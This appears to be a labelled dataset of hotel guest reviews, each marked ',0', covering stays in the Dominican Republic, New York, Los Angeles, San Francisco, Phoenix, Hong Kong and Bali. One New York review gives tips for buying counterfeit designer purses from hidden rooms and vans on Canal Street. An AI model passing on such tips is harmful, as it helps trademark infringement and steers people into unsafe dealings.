"first time in dr just got back to snowy reality on saturday. we spent one week at the occidental grand resort from 22-29 dec, and overall we had a great time, with a couple of minor exceptions.flight airport : arrived via a/c from montreal, good winds on the way down, and so the flight was a bit early. be careful in the airport if you're on a package, the local cabbies will try to grab your business if you can't find your bus, one driver actually had words with our tour operator to the effect that he was taking his business away. fortunately, when you come out of arrivals, all of the tour companies have little booths set up and they will send you in the right direction.transport check-in: bus ride to the resort takes about 20-25 minutes. we arrived at about 12:30, and were assigned a room, only to be informed that it was not ready. there is a big sign over the reception desk that says check-in time is 3:00 pm. so... we sat down in the main reception area to wait after changing into something cooler and had a drink. make sure you pack a t-shirt, and a swimsuit or a pair of shorts in your carry-on. there is a small baggage room near the reception desk to store your luggage while you wait.complaint: as time passed, we saw people who had been on our bus heading out to their rooms, so we went to the desk to ask about ours, and kept getting the 3:00 routine. at 3, we checked again, and were told it would be another half hour. i wandered down to our building this time, and found our room in the process of being cleaned, so we sat and waited a while longer and had few more drinks. we finally got our room at about 4:00 pm.note: just remember you're on island time. impatient canadians and americans always want things now, now, now, and that just ain't gonna happen here...room: we were on the first floor in bldg 13, great location right next to the beach, and away from all the bars. our room was right next to the bulding entrance, we thought it would be very loud in the evenings due to this, but we barely heard a sound. room was clean and comfortable, king size bed, firm mattress, wicker furniture, refrigerator, coffee maker, hair dryer, umbrella, ironing board, and a/c that actually had to be turned up it was so cold in the room...bathroom:",0

"horrible night! my boyfriend and i booked a room here last minute to attend a wedding in scottsdale. i was really excited because i had heard that this was a really nice place. we were really excited when they assigned us a condo type room with a covered parking space. well, when we drove back to our room, which was a duplex, with one more larger room below us, we were upset because all of the four parking spots were taken, by who , i don't know. so we parked on the street. this was fine. so let me get to the horrible part. when we were ready for bed, at about 10pm, we heard very very loud rap music apparently coming from the room below us. i called the front desk once and they called the other room and the music stopped. okay fine, right ? no way. at about 12am we were awoken to very very loud music and a bunch of kids screeming happy birthday. i called front desk, they sent out security and the music stopped. about 20 min later, the music started again. and seriously, it seemed like our walls were paper thin. we could hear these kids cussing and yelling and we even smelled pot. i was so furious by this point, its 2am now, i called front desk and asked for another room. they refused and said they would call security again. security did nothing but made all the kids leave the room. so now the kids are standing outside our window cursing and breaking bottles. was this the hilton or what?? i called the front desk yet again and demand a new room or to call the police. they still did nothing. let me tell you i was even afraid to go outside to check on my car. well, i called and got the managers name, obviously an inexperienced kid, and in the morning when i spoke to the manager, he again did nothing. oh wait, he took $20 off our bill i was so furious!! i will absolutely never ever stay here again. i cannot believe a hilton would allow this. and i didn't even mention that these kids came back in the morning about 6:30 am and began slamming doors. please, don't stay here if you want peace and quiet.",0

great deal this is a great hotel for someone who isn't going to spend a lot of time there...i.e. there is no pool/spa/gym. however our room and bathroom were very clean. the staff were very nice and helpful. it was so close to union square (about 4 short blocks) and the start of the cable cars (a few streets down). my friend and i were even able to walk to chinatown in 20 minutes but public transportation is right outside the door if you are not up for walking. there is a daily continental breakfast included in your stay and if you want something more there is a really cute cafe attached to the lobby. my friend and i took the airport shuttle from the hotel for $14 or you can catch the bart which is a few blocks away.all in all i thought this hotel was excellent for the $85/nt price tag right in the middle of the more expensive hotels. i am going to suggest it to everyone i know planning on visiting san francisco.,0

"a decent hotel at a fair price my girlfriend and i stayed at the stanford court december 27th and 28th. it is a nice hotel that is situated next to the cable trolly system on powell street. the trolly will take you to market street to shop in one direction or take you thru china town to the wharf in the other. if you plan on using public transportation frequently i would get a muni pass from the hotel gift shop (about $11.00 a person). when the trolly was too full we also used bus 30 on stockton street to get us to the wharf(stockton street runs parallel with powell). i would recommend studying a map of downtown san francisco before hitting the streets. here is a quick read about the history of nob hill: [--] the hotel restaraunt has a pretty good dinner and the breakfasts are nice too but a bit pricey. we did not have a car so i cannot comment on the parking however, as others have stated parking is expensive. we would have liked to have a room with a view of the city but instead we were given one with a view of the courtyard. overall this was not a huge minus as we did not plan to spend too much time in our room. overall, i would say if you can get a decent rate under $200.00 i would recommend this hotel. however, if you have to pay a premium i would shop around.",0

"run away! ...as fast as you can! if you're looking for a hotel with no service, this is the place for you! there is an overall lack of management at this property. not enough staff is the biggest fault. the upkeep at this property is non-existent: rooms (and i visiting a few of them) have broken door hardware, outlets, bath fixtures, and non-operating refridges. the grounds around the pool and buildings are not maintained (weeds and small trash are seen in many corners of the exteriors). good luck getting anyone to bring a few towels up to the pool! the unfortunate logistics of the parking on the property are worsened by the fact that the front desk (10 feet away from the front valet stand) refuse to coordinate with the sub-contracted valet/parking folks. an antiquated phone system doesn't allow you to call them either... that would make sense, and anything that seems logical is absent from this hotel. one again, i blame the g.m. of this hotel... and guess what?... there isn't even a manager at this hotel... actually told this by the front desk personnel! now that's logical, huh? i live in los angeles and book my visiting clients in local hotels. i'm glad i never sent any of them here before seeing for myself. please do not be enticed by the low rates and great deals that can be found for this hotel. and one last dig... the 'spa' was running 1 1/2 hours behind on their appointments for treatments. ridiculous. i couldn't keep waiting, so i had to cancel my massage reservation due to other plans. run away!",0

excellent wonderful hotel in a central location. very helpful and at times witty staff! in comparison with other new york hotels the price is a steal. as someone who works in a luxury hotel it is clear that the few complaints about the chelsea lodge come from those expecting 5 star standards. as such it is unfair to penalise a hotel that costs just a fraction of the price for perceived shortcomings. the bathrooms in the corridor were during the whole of my stay immaculate.,0

"wonderful stay!! my husband and i stayed at the chelsea lodge from sept. 14-20th and thoroughly enjoyed our stay. we stayed in a deluxe room (#1) in the basement which had its own private bathroom and plenty of room space to spare. it was well worth the extra money spent for this upgrade from their other rooms. it was cleaned out very well (only smelled of cleaning solution upon arrival and it wasn't too strong). the bed definitely wasn't the most comfortable that i've ever slept in, and it was a little caved in the middle, but it wasn't horrible. after all the long and busy days we could have fallen asleep on the floor! the tv had cable and all the movie channels that you could ask for which was great when we had some down time to relax.the front desk staff were nice enough, we got a good morning every day and they were nice enough to call for a ride for us back to the airport. we took a taxi from laguardia to the lodge which costed about $43 with tip and toll included (we only had to wait about 5 min for a taxi; there is a long line of cars waiting at the airport to take you the city makes sure you don't get ripped off by giving you a slip with rates stated on it). the city can not guarantee you will get ripped off if you flag a taxi outside the lodge to get back to the airport, so that is why its recommended to get a flat rate car or shuttle service. just ask the desk staff the day before you leave to arrange for a car to pick you up from the lodge (this service costed $46 w/ tip and toll).as for new york i learned a few pointers i can share with you. first, if you plan on taking the 1 line (subway) to south ferry for the statue of liberty, make sure you are in one of the first 5 cars in the train otherwise you won't be able to get off on the last stop that you need to get off of. also, be careful when getting on express subway trains. they skip a lot of the stops (black dot stops) on the subway maps! second, skip the top of the empire state building go to the top of the rockefeller center. it costs about the same and you can actually get the empire state and central park in your pictures.third, if you are looking for the quality coach,versace, or luis vuitton purses (the c's look like a c and not q or g) go to canal street into the fake purse shops. even if you only see the obvious fake purses just ask if they have coach (or wait for them to ask you if you want a coach purse) and then they will show you their secret stash or take you into a hidden upstairs room. be aware: i wouldn't do this alone! we were taken into a locked van at one point which i wasn't happy about and no one should be alone, it felt unnerving. if they start walking you away from the stores then you are most likely going to a car so say no if you don't want to do that.as for shows, we saw phantom of the opera, young frankenstein, and hairspray. the last two were excellent and funny, and phantom was good too, but just not my kind of play. if you don't decide to see a show until that day, watch out for raffles done a few hours before the show. both young frank, and hairspray raffled off $25 tickets 2 or 3 hours (respectively) before the performance. the raffle for yf is actually for front row seats which is excellent. we didn't win that raffle but they allowed us to purchase wonderful balcony tickets for the same price. don't forget your cash though, no cards accepted for this deal! if you don't want to take a chance waiting that long to purchase tickets just go to www.nytix.com and for a one time $4 membership fee they will give you promo codes on all plays for 40-70% off ticket prices which you can buy from ticketmaster before you even go on your trip. forget wasting your time and cash at a tkts booth!last tip: don't forget your cash!!! you will be surprised at how many small restaurants, rental places (boats @ central park), and tickets booths will only take cash. have a great trip and don't hesitate to stay at this lodge. we can't wait to come back again!",0

"reasonable for hong kong overall - average missing out on above average. ideal for short stays - maximum 10 days. ideal for independent tourists who are not bothered about mini bars or perks. 6 out of 10. i have been to hong kong 15 times and with the right changes - asthetically inside and outside (uninviting) this hotel has great potential for any owner and for visitors. the positivedorsett seaview was reasonable in cost terms insofar as hong kong hotels are concerned. working out at around 42 gbp, 96 aud, 56 eur or 85 usd per night. only five minutes walk from the yau ma tei mtr station which has links into the centre. ideal for exploring hong kong island and kowloon. ideal for taxis if you really need them. nathan road has excellent bus routes. shuttle bus service to kowloon airport express railway station downtown. friendly staff and room cleaned/stocked daily. busy area seemed safe most of the time. cctv system, calendar of events and weather report on all floors.i would recommend this hotel. the negativehotel could do with a major investment to do it up particularly as hotels in hong kong are few in number in this particular market. i agree that the decor needs to be overhauled - if only to make it up",0

"Have to Disagree.... I have to diagree with the otherwise very positive reviews posted for this hotel. I booked an oceanview room that is nothing like the picture posted on the hotel website. The front desk said that a lot of people have pointed that out..... The 'oceanview' is more a view of two building sites (the Trump Tower will eventually obliterate musch of the hotel view). I was told the duty manager would call me back but he/she never did. The rooms are nicely fitted out but small compared to most Embassy Suites. But the walls are paper thin - even regular conversations can be heard. The room on one side had some kids who where very noisy. Whilst its great that the kids are having fun, i didnt really want to b e part of that experience ! The breakfast was well handled and could easily accomo",0
"great and convinient location stayed 2 nights at inna kuta for a retreat organized by an indonesian government ministry. the hotel has a traditional balinese architecture, rooms are spread in 3 stories and some are in bungalow styles which are great for a family holiday. the hotel has a perfect location for those who'd like to enjoy kuta beach. it has a direct acess to the beach via the hotel's swimming pool. very close to local atractions and plenty of restaurants cafes. staff were friendly, room was clean. great (grassy) terrace area with large swimming pool too. local food in their lunch buffet are very tasty, although they are not well presented.the downside is that the main building lobby are bit",0
"great hotel and great experience this is the place to stay in hollywood. i read some scathing reviews and was prepared to walk if all was not in order (actually had a back up reservation across the street). we booked a pool view cabana room. we got a very nice sized room with an awesome king bed with great sheets. the room was dark but not uncomfortably so. the view of the pool and immediate access to the pool was nice. i can't imagine being in the tower rooms since so much of this hotel revolves around the pool and the tropicana. when we arrived the valet was courteous, check in efficient and the bellman superb giving us some hints. this was my girlfriend's birthday and all was in order. oh yeah, we are not in our 20's, but late 40's, and we did not feel out of place at the pool. we made contact with a pool attendant greg immediately, and made arrangements for specific lounge chairs by hollywood's most popular pool. it helps if you are wiling to tip to get prime real estate by the pool, and want to sleep in. while the drinks and pool snacks are a little pricey hey it's a vacation relax and go with it. the pool becomes a nightclub at night with a line, but as a cabana guest you have access with no questions. it can be loud until about 1:20am, so be warned. well worth stopping here for a drink on the way to your room the library lobby bar is beautiful and serves up drinks in a more sedate atmosphere. while there you really should try dakota for a high end steak dining experience. excellent service and corkage for $20.00. also try the killer hamburger and breakfast bar open 24 hours it is called 25 degrees. the hotel walking distance to all the great places in hollywood. we did the magic castle and pantages (wicked). the only bummer is we did not have time for musso and frank grill. i am already thinking about booking another weekend here.",0

"the good outweighed the bad my husband and i spent 3 nights here in january 2005. i believe this is a pet friendly motel, which would account for the overwhelming smell of animal urine which nearly knocked us over every time we entered our room! the motel was full being over new years, so we were not able to be moved to another room.apart from that, the staff were very friendly and helpful, the rooms were nicely decorated, and the beds were very comfortable. there is also internet access for a fee in the main lobby.we would probably stay here again, as the location is also good.",0

"by far the best service the service at the omni is some of the best of any hotel property i've ever stayed at. i had a suite on the club level over looking the downtown sky line. the employees at the property gave me great service. from the parking attendent to the concierge on the club level, whatever i asked they gave. the room was clean with turndown service. afternoon drinks in the lounge were great. i live 15 miles from this hotel and it felt like i was vacation even if it was just for a day. i plan to stay here again in june.",0
"comfortable at stanford court i booked three rooms for three nights for our family get-together in san fransciso. everyone really enjoyed comfy, clean rooms and the price was very reasonable on priceline. all three rooms were newly renovated on the upper floors! free champagn in the lobby on thursday evening welcomed us to the hotel - very nice. the concierge was fabulous! we had trouble getting reservations to the slanted door - a restaurant that was highly recommended to us. the concierge was able to book our reservations like magic. the concierge continued to be our best friend throughout the weekend. the hotel is undergoing renovations but we were only disturbed by noise on late friday afternoon. everything was quiet over the weekend. this is a nice location with easy access to public transportation. the trolleys were very crowded most of the time but well worth the wait to back to the hotel...as it's a very steep walk from almost any direction! we had breakfast at the hotel one morning and it was pleasant and delicious - although the service was a bit slow. we did have difficulty keeping ice in the room with no ice machine available. room service would bring ice - but it usually took awhile. we took the hotel limo to sfo airport for a very reasonable price. overall a very nice weekend!",0

"good location and excellent service. not perfect, however... i booked the sofitel for a one-night stay on a mid-week business trip to los angeles. the hotel is nicely situated directly across from the beverly center, one of la's best shopping malls. good food and sightseeing options are right outside the door, which is rare for la.the hotel is modern and hip with very well kept grounds and an impressive entry area. the rooms are also modern in appearance with flat panel tvs and sharp, clean decor.i found the service to be superior, from the reception to the valet parking attendants. no issues at check-in. check-out or anywhere in between.consistent with earlier reviews, the room i was given was very small for the states. if i was with my wife, we would have been cramped. but, for one, the size was fine. i also found the room to be otherwise spotless and comfortable, with a good view of the busy la street scene below. the bed was comfortable and i slept well.so, in all, i would recommend the sofitel for travelers to la or those on business. it is well located and can be a good value, especially if you shop around on discount internet websites.",0

"what a disappointment! i stayed at the hyatt at the end of march and suppose i should start with the good. the staff were friendly and helpful, and the rooms were clean.the bad should start at the beginning.don't help yourself to the bottled water that's on the desk when you walk into your room. it is $5.25 a bottle. instead, go back down to the ground floor and get it at einstein's cafe for $3.00.don't count on getting any really hot water out of the tap. no matter what time of day or night i tried, the best the 16th floor would produce was lukewarm - too cool for comfortable shaving. it did make adjusting the shower easy, though; i just turned it on to maximum hot and it was barely warm enough.in-room coffee pots are standard in most hotels, but the hyatt cheaps out with the little 1-cup-at-a-time jobbies that use the innstant coffee packs. yuck!bring your own headlamp if you intend to read. the lighting in the rooms is little better than a candle in a cave.if you are a government traveler, forget about your beancounter's insistence that you use the tax-free number for your agency - the desk will not recognize any but arizona state agency tax-exempt status.forget about a courtesy shuttle from and to the airport - it is far less expensive to use a regular taxi.the bathroom fans must hold the record for noisiness! go ahead and sing while showering - nobody will hear you over the fan's noise.in-room internet access in sincredibly expensive at $10.95 a day.i could go on, but this should suffice to persuade you that any of the other nearby hotels are a better choice.",0

great buffets! there are two great things about this hotel - proximity to universal studios and their abundance of good food at their buffet dinners and breakfast on sunday!the rooms look tired and need updated - including the tvs. the shower had very little pressure and was disappointing. the staff was luke warm with the worst being the check in desk. room service was actually good with good service and good food. the free shuttle to universal studios was suppose to run every 15 min. but you can't depend on that. we waited 40 min. each way.,0

"Very nice but needs updating We stayed at Uma for 3 nights last week. We had paid for a Terrace room but were upgraded to a Garden room. Overall the hotel is very nice however for the price we paid the value wasn't there. The room was a good size, especially since we were traveling with our young daughter, but the rooms were tired and are in need of updating. There is nothing on the walls other than white drywall so you really notice that the tiling is in need of repair, stains on the walls, the mosquito nets have tears and the towels were often tattered. It looks like the hotel was once absolutely wonderful but it has now past its glory days. It needs some love and care...or at a minimum something on the walls so you don't notice all the faults. If you stay in a Garden room I recommend asking for #16 as it has the biggest garden area. I did not see the villas so perhaps they are in better shape and have been more recently up",0
loved the grand hyatt singapore i have just returned from staying at the grand hyatt singapore. i was there with my wife and one year old baby girl. the location of the hotel was perfect right off of orchard rd. it is situated in the center of the shopping district. there are also some good open air bars around this area. the hotel itself has great restaurants. pete's place and mezza 9 both have to be visited at least once. try the brick oven pizza at pete's place and the steak at mezza 9. the room had a é¥?¸?ewé¥?feel to it. we were staying in one of the junior suites which are very spacious and clean. the cleaning staff paid good attention to detail. also there was direct access to the club lounge where they had complimentary continental breakfast and evening drinks. internet was complimentary through wi -fi which in my opinion is a big plus. derek tan at the concierge desk was extremely helpful. we had a few special requests which he happily did for us. we have never received such great service from a concierge before. he went out of his way to accommo,0

"great hotel near the airport my wife and i stayed at this hotel last weekend when we had to fly out of the phoenix airport at the ungodly hour of 5:30am. the hotel advertised 24-hour shuttle service, which is fairly rare in my experiences (although i do not claim to be an expert). when we checked in, we were informed that the shuttle ran from 5:30am until 10:30pm but that they would call us a cab and pay for it (something else i had never experienced in the past). the cab was a towncar service.the hotel room was somewhat oddly laid out but was very functional. radisson recently upgraded all of their rooms to include sleep number beds and we found the bed to be comfortable but certainly not the most comfortable i've ever slept on. to be fair, neither my wife nor i sleep well before an early morning flight (probably due to fears of missing the plane) so i'm not sure if we might have been more optimistic about the beds under different circumstances. the room was well appointed and relatively spacious. no one could have found faults with the hotel or the hotel room's cleanliness. wireless internet service was included as well. the front desk staff was very pleasant and professional. we had a few drinks at the bar but did not try to eat at the on site restaurant.overall an excellent stay at a recommended hotel.",0

"Perfect 1st Anniversary My husband  I just got back from our first trip to NYC (Sept. 14-16). I've never written one of these reviews, but since we relied so heavily on TA to check out our options, I felt we should. We had originally booked the Comfort Inn Midtown ($239/nt), but kept checking other hotels hoping that prices would drop. We lucked in to a deal with the Residence Inn, which was great ($209/nt, king suite). I e-mailed the hotel to say it was our anniversary, and if possible could we have a room with a view. They responded right away to say they'd try to accommo",0

"great for kids we are a family of two adults and four children (aged between 5 13). we stayed 2 nights a couple of weeks ago as a stop-off between san diego and the grand canyon. we booked a casita and were pleased to note that it was very close to the river ranch pool complex. the casita was clean and the beds were comfortable (even the sofa bed) although i felt that the room could do with brightening up a bit. after settling in, we headed for the pool complex, which was quieter than we expected. we all enjoyed the lazy river and the sport pool. we chose to bring our own food for breakfast, to keep costs down, and were back at the pool at 8am the next morning as it opened. again, we had a great time, but had to retreat to the shade and cool of the casita for an hour at lunchtime. we found the young pool area staff to be helpful, the ice cold water coolers a bonus and the gift shops reasonably priced. my son enjoyed the mini golf and we discovered by chance on the second day that we were entitled to free golf and half price ice cream as we apparently were on the value package. it would have been nice to have been told this upon arrival. be aware that if you are in the hotel rooms in the courtyard near the other pools, these do not close until 11pm. when we were there, a group of teenagers seemed to be occupying it. not causing trouble, but being loud. if you have young children, this could disrupt an early night and we were therefore pleased that we were out in a casita. for a couple of days by the pool, it was ideal for us.",0

"great place to stay but not perfect four of us stayed at this hotel for a girly week away 5-12 jan. the hotel itself is great. it is in a quieter part of town so it is possible to get a good night's sleep after a day of shopping and sightseeing and all the major attractions are within easy walking distance. having seen times square at night, we were very glad that we hadn't booked a hotel in that area given the level of noise (new yorkers like to use their car horns all day and all night!!).i booked the room directly through the hotel website and requested a quiet room on a high floor with a view and that is exactly what we got. we were in room 3206 with a view of the east river and downtown manhattan. it was lovely to watch the sun rise over the east river in a morning. the room itself is very spacious and the kitchen is very handy as we sorted our own breakfast out every day. other reviewers have remarked that the bathrooms are small but we didn't think so and there was four women to accomo",0
"excellent service and comfortable stay at the omni stayed at the omni for two nights on business travel. from the moment i arrived when the valet picked up my car, to the moment i departed when the valet returned my car, i experienced nothing but great customer service from omni's staff. a first i was skeptical, thinking that the staff was being nice to perhaps make up for less adequate rooms, but when i opened the door to my room, i found it to be clean, comfortable and modern. no dust or crumbs around the baseboards. the mattress was high and firm. the sheets were white and the beds were decorated with accent pillows. the bathroom featured a separate shower and tub, complimentary toilettries and clean, white shower rugs. i also used the fitness center and was impressed with the number and condition of the cardio machines. most hotels have one or two machines that are terribly outdated. the fitness center at the omni was spacious and featured elliptical machines, treadmills with mini tvs, and some machine and free weights. the free weights were a little on the old side, but the overall fitness room was more than what i expected. further, the omni has a courtesy car that can take you to any business location in the city! i definitely recommend the omni if service, cleanliness and amenities are of importance to you.",0

"pretty nice but..... i recently stayed over a fri/sat night weekend. first off, the location is super safe and can't be beat. it's on a great stretch of wilshire blvd., next to westwood/ucla, close to santa monica, lax, etc... and beautful residentail neighborhoods.i thought the front staff to be very accomodating and nice. the hotel is chi chi boutique, the rooms are smaller but nicely furnished, the restaurant had really great food, i was surprised by that. the pool area in the back is totally cute as well. downside, the a/c is extremely loud! like crazy loud. it scared me! i couldn't sleep with it on and during the day, i tried not to listen to it. an engineer came up and checked it and said i actually had a quieter room. i could tell this was a refurbished older property, as i could also hear the upstairs shower sink, something you expect in a motel. the $30 a day parking was steep but at the same time, it was kinda convenient, becuase you just went out front and in a minute, the valet had your car for you, so you pay for your convenience. i only paid $179 which was i think worth it in this area, however if i had to pay something like over $300, i'd rather fork out at one of the older grander hotels for that kind of money.",0

"it was ok, nicely located near everything hotel was ok. there was no great shower like everyone mentions, so it must not be in every room. room was average size. beds were comfortable. view was of the side of the mall with a huge billboard of evan almighty. conceirge was fabulous and helpful but the best part of the hotel was our bellhop, he was such a doll and soooo very helpful. guy at front desk was a bit stuffy. never got to use the pool as it closes at 10pm. i learned nobody likes to walk in la, as i chose to walk to the farmers market the grove and people thought that was nuts, it wasn't that bad. we took a cab back and that was only $10. walking distance to the ivy were we had lunch. walking is also close to spago were we had dinner. parking was $26, which for la is not too bad, but it was no fun having to call every time we needed the car and of course each time you called for the car you have to tip the valet. the mall across the street is great! we felt very safe at all times here at the sofitel. overall, i think the hotel is overpriced, but the rooms were nice, nothing to write home about though.",0
"certainly not a luxury hotel i might have set my expectations too high. after checking the hotel's website, i thought i'd be staying a pretty luxurious hotel. not exactly.the lobby decor is nice, but the decor in the detached building (where my room was located) was dated and stale. 70s motif, very musty smell. in dire need of a remodel. (they should add an elevator at that time, as well.)the room itself smelled stale. the decor was a mix of 70s (the bedspread, carpet) and current (the furniture) influence. there was lipstick on the clean glasses in the room. i think i was shuttled to the less than desirable building. probably not true, but that's how i felt.i think you get treated better if you're a celebrity or a regular. the were more than helpful for a patron looking for the presidential suite and another patron who had been staying with them for years. on a positive note, the food was great. i wouldn't return to the luxe bel air, though.",0

"whatever your standards lower them stayed here nov 6th to 11th 2004 and overall i would have to say what a let down it was. the room we stayed in had been recently refurbished and apart from the carpet that must have been fitted in the 30's it was acceptable. i suppose we were lucky in that we had hired a car and only used the hotel as somewhere to sleep. anyway a few of the bad points - if you can speak spanish or ukranian you'll at least be able to talk to the staff otherwise take an interpreter. one day i lost a jumper in the hotel and could not find one person that understood me - now i know i'm from yorkshire but come on. to be fair there must be one english speaking person that works there because they rang our room at 3.45am one morning and asked us not to use the faucet because they had a flood in the room below ours. the hotel seems to mainly cater for various functions that seem to happen every night and paying foreign tourists are just an unwelcome inconvenience. obviously these are only my opinions and we still had a great time in la, but do yourself a favour and book somewhere else.",0

"would happily stay here again. we spent eight of the past nine nights (march 10 - 18)at this hotel, and had no problem with it. breakfast was good, the pool very appealing, and the complimentary happy hour jovial. service was cheerful and friendly - both room service and restaurant. the location is quite central in far-flung phoenix, and handy to the airport and freeways. there's a good grocery store a couple of blocks away, and the hotel provides barbecues and dishes if you want to dine in. a room on the east side will be quieter than the west; some people using the parking lot after hours can be noisy.",0

"what a fabulous place my husband and i have just returned from this hotel and have had a wonderful holiday. given the numerous negative reviews prior to departure we were seriously starting to wonder if we had made a bad choice and were considering trying to change the hotel. thank goodness we did not. we would have mised out on one of the best holidays in the dr.this hotel is spotless. there is an army of staff constantly cleaning and tidying all day long. we saw maids at 8pm cleaning sunbeds around the pools in the dark. at other hotels we have been woken by scraping beds being moved around and jet washers at 6am. the toilets are kept immaculate, even those at the poolside beach and snack bars are well tended and kept clean and these get plenty of hammer all day long.we had a lovely room in block 29. we initially had asked for a top floor room and were told to go back after the weekend as the hotel was full. but did not bother to move as we were very comfortable there.the maid service was excellent. always fresh towels and flower/towel art on the bed. the lobby bar is fantastic. lovely decor and very comfortable.the drinks are top quaility and lots of choice. there are some drinks which are not all inclusive. this worried me to start with becasue i expected the included drinks to be poor and have to pay for anything decent. how wrong could i be. there was a good enough range of international drinks on the inclusive list and the house wines were extremely good. my only complaint - i did not like the beer. but i enjoyed trying other drinks such as spritzers and probably saved myself putting on an extra couple of pounds.the buffetts are excellent - plenty of variety from salads to pizza to carved meats and fish. you could have something as simple as a ham sandwich up to a 4 course meal for breakfat lunch or dinner. anyone who cant find something to make a meal of here ought to stay home.the dining room service was the best we have experienced in our 6 visits to the dr. you are guided to a table at every sitting - no more stumbling around half awake at breakfast trying to find a free table. as soon as we were seated a waiter arrived within seconds. we never waited any notable length of time for anything here. our drinks were always poured ready for us returing from the buffett and we never managed to empty or glass/cup before a refill was offered.the staff are very friendly and polite and happy to help. finished plates were cleared away very quickly and we were constantly being offerred coffee/brandy etc.we never experienced any language problems. it does help to try a little spanish - lets face it it is not difficult and it goes a long way and seems to be appreciated by the staff. i am no expert and cant even try to hold a conversation but how hard it is to say hola ? just learn your drink order - vino tinto is so simple if you want red wine or blanco if you want white.we had no trouble whatsoever making reservations for the speciality restaraunts but there was only 2 of us and we were flexible for days and times. larger groups who all want to sit together at specific times will obviously be more difficult to accomo",0
its the best of the best for a reason one of the more affordable and better hotels in the city of seattle. i had a great time during my stay because of great service and friendly employees. the location is convenient and parking is cheap. i give this hotel an a+,0

"perfection i don't know where to start. this hotel is simply spectactular. i was a guest at the hotel in june 2007. traveling to arizona to attend a wedding, i first took a quick side trip to tucson, to visit friends, and stayed at the arizona inn there. how disappointing! beautiful grounds, great pool, but the room was mediocre, a bit tattered and worn, and overall did not measure up to the positive reviews i saw on tripadvisor, and which prompted me to book my stay there. so, my expectations were relatively muted when i made my way to phoenix and royal palms. on entering the property, i was blown away by the stunning architecture and gardening. in the reservation desk area, they had a pitcher of tasty and refreshing pink lemonade (lord knows it was certainly hot!) and i was greeted warmly by the reservation agent. here's where things started to get real good. traveling in the off-season, i thought i'd secured a pretty good deal - i believe it was $150/night for one of their basic rooms. well, without even asking, i was upgraded to one of the new spa suite rooms. when the bellboy took me to my room, and opened the door, i almost fainted. it was stunning! on entering the room, the sounds of soothing, acoustic music enveloped you. the lighting was just right, dim, and romantic. the first part of the room is a sitting area with a luxurious, turkish-like seatte, full of comfy pilows - across from that you had an impressive entertainment unit and a small wet bar area. in the center of the room was the most luxurious bath i've ever had the privilege of looking at, let alone, using! deep, soaking tub, those bowl sinks that sit on top of the the vanity. a walk-in steam shower, lotions, shower gels, shampoo and conditioners that were heavenly! you then enter the bedroom, and it was the most comfortable bed i've ever slept on. just gorgeous. dark stained wood floors. two plasma tvs (one in the sitting area, another in the bedroom). and to top it off, a beautiful balcony that looked over a stunning courtyard area. one afternoon we were serenaded by a spanish guitartist. pinch me - i must be dreaming!! unfortunately, it was so daggone hot, i couldn't really take advantage of the balcony. also, because i was running around a bit for wedding activities, a long day trip to the grand canyon and the police concert the monday before i left, i really didn't get to enjoy the room for my 4 night stay as much as i would have liked. but that just gives me an excuse to make a return trip - during a better -cooler - time of the year.oh - and service. talk about going the extra mile. i discovered that my credit card was missing from my purse. i couldn't find it anywhere. i wasn't sure if i'd dropped it while shopping or possibly in the car. well, one of the valets did a painstaking search throughout my rental car and managed to find the card in a really obscure location. i guess it had fallen out of my purse while i was driving. i was so grateful for the time and effort this gentleman put into finding the lost item. overall, service was exemplary throughout my stay.royal palms has spoiled me for life when it comes to hotel accomodations. i doubt there is a place that will ever measure up to my experience last summer. the surprise factor alone of getting such a beautiful room at a fraction of it's normal nightly rate is something i'll likely never experience again. in a nutshell, royal palms is simply amazing!! or as one of my good friends likes to put it: all that and a bag of chips!!!you won't be disappointed...",0
"comfortable hotel i stayed in one of the suite rooms for a couple of days and then around four days in a standard room with a mate this april.the suite was very comfortably, roomy and clean. it was a ground floor room that faced the main street which made the room a bit noisy in the morning and sometimes late evening - though nothing that caused a major concern. the bathroom had a shower (with great hot water) and the kitchenette was handy though we didnt use it.the standard room was very small and dark even though decorated with light colours. the room faced the next buildings' wall so was generally quiet (though no view!). all of the other rooms seemed to be packed in very tighly so you could hear other guests through some of the walls and walking up the stairs and down corridors. the shower and basin was fitted in the room which made it a bit snug. the thought of shared toilets made be quiver before i arrived, though they were very clean all of the time. the shower had very hot water.staff were generally very friendly.for the prices you pay in nyc i think that chelsea lodge was generally good value. i would stay here again though i would book one of the suites for a more spacey stay.",0

"location, location, location stayed for 4 nights late in july with partner and 2 kids (18y/o and 15 y/o). booked after reading reviews here on ta and everything was just as expected.if you want 5* luxury then look elswhere. if you want decent accomodation in the heart of la at a reasonable price then look no further. sure, the place is a little dated and the rooms could all do with some attention but at the end of the day it's a hotel and is to be used as a base and somewhere to sleep.we booked a one bed suite so the kids could have a seperate sleeping area and we found the room to be large enough to accomodate us all easily. there was a kitchen area but we never used if for more than boiling a kettle.this place is all about location - within 2 minutes you can be right on hollywood boulevard in the middle of the action. there are lots of places to eat in and around the hollywood and highlands centre and even a great view of the hollywood sign.access is easy and the underground parking and free (although intermmitent) wi-fi came in handy for keeping in touch. front desk more than helpful when required and we did hear the traffic making deliveries to the hh centre but it never disturbed us. kids loved the pool after a hot steamy day in la.overall we were very glad we booked this hotel and would have no hesitation in recommending to others who are looking for reasonably priced accomodation in the heart of los angeles.",0
"home from home i stayed at the chelsea lodge in march of this year and had an amazing time.i arrived during a massive rain shower and was dripping wet and the staff could not be more helpful and do more for me. my room was on the 2nd floor and was perfect and very homely. this whole place feels homely and as it is on a quiet st you actually feel like you are living like a new yorker. i had a room that over looked the back yard and woke up every morning to the sound of birds tweeting, which i loved as that would be a rarity at any other hotel. the staff were always very friendly and talkative asking how my previous day had been and what my plans for the current day was. even the cleaning staff were really nice and friendly and your room and towels are cleaned everyday.there is a great cafe just round the corner on 8th between 20th and 21st called dish which i went to every morning for breakfast as the food and staff were amazin. this just completed the feeling of being a new yorker as you got to know the staff like a local would.i was there for 5 nights in total and my only complaint is that my stay wasnt longer, but hey thats my own fault. i am going to return to nyc next year and would not even think about booking another hotel as i will stay here whenever i return now.dont delay - book up today and then concentrate on what do to on your trip without worring about what your hotel will be like, as if you book here i gaurentee you wont be disapointed.",0

